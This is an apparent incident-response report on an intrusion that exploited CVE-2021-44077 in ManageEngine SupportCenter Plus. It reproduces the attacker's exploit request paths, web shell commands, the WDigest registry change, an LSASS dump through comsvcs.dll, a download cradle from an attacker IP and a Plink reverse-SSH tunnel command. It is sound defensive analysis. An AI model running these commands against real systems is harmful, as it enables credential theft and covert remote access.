# Case Summary
The intrusion began with the exploitation of an internet-facing instance of ManageEngine SupportCenter Plus via the CVE-2021-44077 vulnerability. The threat actor successfully exploited the RCE vulnerability in SupportCenter Plus, which allowed them to drop a web shell in an internet accessible directory. The exploit we witnessed looks very similar to a publicly available POC exploit on GitHub.

The threat actor then performed some generic enumeration of the system and enabled WDigest authentication on the server using the web shell. Enumeration on the system included querying network configuration, a list of domain joined computers, user and OS information, and current user sessions on the beachhead.

Periodically over several days, the threat actor returned and checked what users were logged into the beachhead server using the webshell. Finally, on the seventh day, the threat actors performed an LSASS dump on the system, which captured the credentials of an administrative user that had recently logged into the system. In this case, the threat actor had access to the user’s plaintext credentials as a result of WDigest authentication being previously enabled.

The following day the threat actor downloaded ekern.exe, which was a renamed version of Plink, and deployed a script to establish a reverse SSH connection to the RDP port of the beachhead server. An interactive RDP session was successfully established to the beachhead server by the threat actor where they began enumerating other computers on the network.

From the beachhead, lateral movement was conducted to three other servers via RDP, including a domain controller, a file server, and another server. Confidential files were exfiltrated from the network throughout this intrusion using a mixture of web shell access and hands-on keyboard access via RDP.

These files, were critical to the business and it’s partner. The documents were selectively chosen as if the attackers were looking for specific material. When it came time to exfiltrate certain files or folders, one folder of the utmost importance was exfiltrated while passing on other partner folders and files.

Besides the files and folders mentioned, internal machine certs were reviewed and later exfiltrated. The exfiltrated information has not been found in any public dumps or sales to date.

The threat actors were evicted from the network soon after stealing this information.

# Analysis

Initial access began with the exploitation of ManageEngine SupportCenter Plus via CVE-2021-44077, an unauthenticated remote code execution vulnerability. There are two main HTTP requests responsible for this exploit.


The first request sent a POST containing the contents of a PE file which was written to:

C:\Program Files\ManageEngine\SupportCenterPlus\bin\msiexec.exe


/RestAPI/ImportTechnicians?step=1
The second request, attempted to install Zoho’s Site24x7 performance monitoring tool but indirectly invoked the uploaded msiexec.exe file. More details regarding this are covered in the Execution section.


/RestAPI/s247action?execute=s247AgentInstallationProcess&apikey=asdasd
The exploitation attempts against the internet-facing server arrived from two Tor exit nodes. Each step of the exploit was observed originating from a different TOR exit node.
- 2.58.56.14
- 185.220.101.76


# Execution

The second stage of the CVE-2021-44077 exploit involved initiating the installation of Zoho’s Site24x7 performance monitoring tool. Support Center Plus will do this by invoking the installation via msiexec.exe by running:

msiexec.exe /i Site24x7WindowsAgent.msi EDITA1=asdasd /qn

The running path of Support Center Plus at the time this command runs is C:\Program Files\ManageEngine\SupportCenterPlus\bin\ which means the msiexec.exe uploaded by the threat actor will be favored rather than the legitimate Microsoft utility.



Once the malicious msiexec.exe is executed an embedded Java payload will be decoded and written to:

C:\Program Files\ManageEngine\SupportCenterPlus\custom\login\fm2.jsp
The parameters passed to msiexec.exe are never used and the Site24x7 performance monitoring tool is never installed.



The web shell was written to:

C:\Program files\ManageEngine\SupportCenterPlus\Custom\Login\fm2.jsp

This location is web accessible which means the threat actors can interact with the web shell through a web browser from the internet. Here are a few commands run through the web shell.
- https://server.example/custom/login/fm2.jsp?cmd=arp -a
- https://server.example/custom/login/fm2.jsp?cmd=del c:\windows\temp\logctl.zip
- https://server.example/custom/login/fm2.jsp?cmd=systeminfo
- https://server.example/custom/login/fm2.jsp?cmd=tasklist
- https://server.example/custom/login/fm2.jsp?cmd=wmic computersystem get domain

The following diagram visually illustrates the CVE-2021-44077 exploitation and execution process.

The threat actors had previously uploaded a different file, named the same thing minutes before the web shell was created. After the execution of that file seemed to fail, the threat actors uploaded the msiexec.exe file from above which created the web shell seconds later.


The two msiexec files included the same web shell but had some differing characteristics. Here is some information on the first attempted msiexec file which failed.


The main difference being the interesting PDB path m:\work\shellll\ and the differing .NET versions.

# Application logs
We can see from the Catalina.txt log that when the threat actors run certain commands such as fxs.bat (RDP tunneling) the application thinks the process is hung (runs for 30+ seconds) and creates a warning message:

[REDACTED]|[REDACTED]|[org.apache.catalina.valves.StuckThreadDetectionValve]|[WARNING]|[57]: Thread [/login/fm2.jsp-1649702723966_###_] (id=[64]) has been active for [39,915] milliseconds (since REDACTED]) to serve the same request for [http://REDACTED:8080/custom/login/fm2.jsp?cmd=C%3A%5CWindows%5Ctemp%5Cfxs.bat] and may be stuck (configured threshold for this StuckThreadDetectionValve is [30] seconds). There is/are [1] thread(s) in total that are monitored by this Valve and may be stuck.|
In the Securitylog0.txt file, we can see the request made to the web shell and timestamp over and over but not much else.
[REDACTED]|[REDACTED]|[com.manageengine.servicedesk.filter.SdpSecurityFilter]|[INFO]|[76]: RequestURI::::::: /login/fm2.jsp|
These are all the Support Center Plus logs we could find relating to this intrusion, leaving a lot to be desired.

# Persistence
The web shell dropped to the beachhead during the exploitation process was the only form of persistence observed during the intrusion.

There are multiple remote interaction capabilities in the Java web shell, including:
- Execution of commands
- View and download files
- Creation of new files


# Privilege Escalation
Privilege escalation was not needed on the beachhead ManageEngine server as the exploit provided the execution of commands through the web shell SYSTEM level privileges. Later during the intrusion they dumped credentials for a user that had privilege’s allowing lateral movement throughout the environment. More on the dumping method in the Credential Access section.



# Defense Evasion
During the initial access, an attacker uploaded a binary named msiexec.exe onto the system. This binary isn’t the legitimate Microsoft msiexec.exe, rather it is a dropper that contains an embedded encoded web shell. The naming of this executable has the benefit of blending into the environment and appearing legitimate, while also being critical to the exploitation of CVE-2021-44077.

During a later stage of the intrusion, an attacker dumped the LSASS process (see Credential Access section). After exfiltrating the LSASS dump, the attacker deleted the dump file to hide their traces.





Once the credentials were harvested from the LSASS dump, the threat actor returned to the environment and downloaded the binary named ekern.exe to tunnel RDP connections over SSH. Ekern.exe is the plink.exe tool renamed in order to stay under the radar. Furthermore, the name ekern.exe is similar to the name of a known component of ESET named ekrn.exe.



On the beachhead system, the threat actor queried the registry checking to see if WDigest was enabled:

HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential

WDigest allows for credential caching in LSASS which will result in a users plaintext password being stored in memory. The intended purpose of WDigest credential caching is to facilitate clear text authentication with HTTP and SASL, however, this can be misused by the threat actor to retrieve the plaintext credentials of a user.

Here’s the command executed from the web shell:

powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential


This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.



Twenty-two seconds later, the threat actor enabled WDigest using the following command, via the web shell:

powershell.exe  Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'


# Credential Access
After enabling WDigest, the attacker checked back numerous times over multiple days to see who was signed in. During this period, a privileged user logged onto the system for maintenance work and after which, the threat actor dumped LSASS using comsvcs.dll. The threat actor listed the running processes via the tasklist command and used the PID of LSASS from the output to pass to the credential dumping command.

"C:\windows\System32\rundll32.exe" C:\windows\System32\comsvcs.dll MiniDump  C:\windows\temp\logctl.zip full


The LSASS dump was then exfiltrated out of the environment for offline analysis and rest of the actions were conducted from the account whose password was extracted from the LSASS dump.

# Discovery
The threat actor used the web shell fm2.jsp to conduct their initial discovery on the host. Below are the GET requests sent to the web shell with the discovery commands passed to the cmd parameter, which runs as PowerShell.
- powershell.exe reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
- powershell.exe query session
- powershell.exe systeminfo
- powershell.exe quser
- powershell.exe arp -a
- powershell.exe wmic computersystem get domain
- powershell.exe netstat -an
- powershell.exe ipconfig /all

They also used the web shell to review directories, here’s a few examples
- /custom/login/fm2.jsp?p=C:/Windows/Temp&action=get
- /custom/login/fm2.jsp?p=C:/Windows&action=get
- /custom/login/fm2.jsp?p=C:/&action=get
- /custom/login/fm2.jsp?p=C:/ALLibraries&action=get
- /custom/login/fm2.jsp?p=C:/Users&action=get
- C:/Windows/Temp
- C:/Windows
- C:/
- C:/ALLibraries
- C:/Users

# Lateral Movement
The threat actor used the web shell to download file.exe onto the beachhead and save it as ekern.exe using a PowerShell download cradle.

powershell.exe (New-Object System.Net.WebClient).DownloadFile('hXXp://23.81.246[.]84/file.exe', 'c:\windows\temp\ekern.exe')
The file ekern.exe was a renamed copy of Plink.exe, a command-line SSH client.



Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor’s server.





Let’s break down what this command means:

Providing “y” as standard input to the executable. To confirm when plink asks if they would like the public key added to known hosts.

c:\Windows\temp\ekern.exe

Plink executable

-ssh

Force the use of SSH (Plink can support other protocols)

-P 443

Define a specific target port for SSH connection

-l admin1

Connect with the specified username

-pw Asde345@#$345sdfDFVCDF

Password to authenticate with

-R 23.81.246.84:49800:127.0.0.1:3389

Listen on 23.81.246.84:49800 and forward it to 127.0.0.1:3389. This effectively proxies the request to the host running the command

23.81.246.84

Target server to SSH

The actor defined a custom target port to Plink (-P 443) instead of the default SSH port of 22.

The actor used the technique of port forwarding to listen on the remote port, 23.81.246[.]84:49800, and forward the requests to 127.0.0.1:3389. This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.



The script FXS.bat was re-used multiple times to establish connections to various hosts.

The actor then replaced the loopback address with various internal hosts. The ManageEngine server acted as a proxy that forwarded the RDP traffic between the target host and the threat actor’s server:

echo y|C:\windows\temp\ekern.exe -ssh -P 443 -l admin1 -pw Asde345@#$345sdfDFVCDF -R 23.81.246.84:49800:10.X.X.X:3389 23.81.246.84


# Command and Control
All command and control traffic we observed was through the SSH tunnel to 23.81.246.84. That IP address was exposing an SSH server on port 443 which was what the beachhead made connections with.

The headers of 23.81.246.84:433 reported the threat actor was using a Bitvise SSH Server:

# Exfiltration
After getting a foothold on the beachhead machine, an attacker first downloaded the postgres DB backup of the ManageEngine SupportCenter Plus application using the web shell.


Seven days after initial access, an attacker exfiltrated a certificate from the server, a Visio file, and an excel sheet for the accounts via web shell:

Server certificate downloaded via web shell:



Visio file downloaded via web shell:



Excel file downloaded via web shell:



An attacker was also seen exfiltrating confidential documents during a RDP session and triggering canary tokens from 192.221.154.141 and 8.0.26.137 upon opening the documents.

Impact
The threat actors were evicted from the network soon after stealing confidential information.

# MITRE ATT&CK DATASET
T1190 – Exploit Public-Facing Application
T1572 – Protocol Tunneling
T1012 – Query Registry
T1003 – OS Credential Dumping
T1087 – Account Discovery
T1057 – Process Discovery
T1021.001 – Remote Services: Remote Desktop Protocol
T1059.001 – Command and Scripting Interpreter: PowerShell
T1047 – Windows Management Instrumentation
T1070.004: File Deletion
T1078.002 – Domain Account
T1112 – Modify Registry
T1036 – Masquerading
T1505.003 – Server Software Component: Web Shell